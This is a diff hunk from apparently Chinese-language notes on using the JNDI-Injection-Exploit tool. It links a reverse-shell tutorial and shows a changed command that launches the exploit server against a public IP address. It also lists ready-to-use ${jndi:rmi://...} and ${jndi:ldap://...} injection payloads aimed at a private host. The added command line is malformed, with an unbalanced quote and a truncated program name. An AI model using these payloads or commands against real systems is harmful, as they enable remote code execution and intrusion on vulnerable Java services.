@@ -53,7 +53,7 @@ JNDI利用工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
 jndi进行命令执行，反弹shell：<https://blog.csdn.net/m0_74294234/article/details/137188160>
 支持同时启动ldap服务和rmi服务。
 ```
-java8 -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C alc.exe" -A 47.109.58.205
 
 ${jndi:rmi://192.168.1.8:1099/yfwrr7}
 ${jndi:ldap://192.168.1.8:2113/akndj}
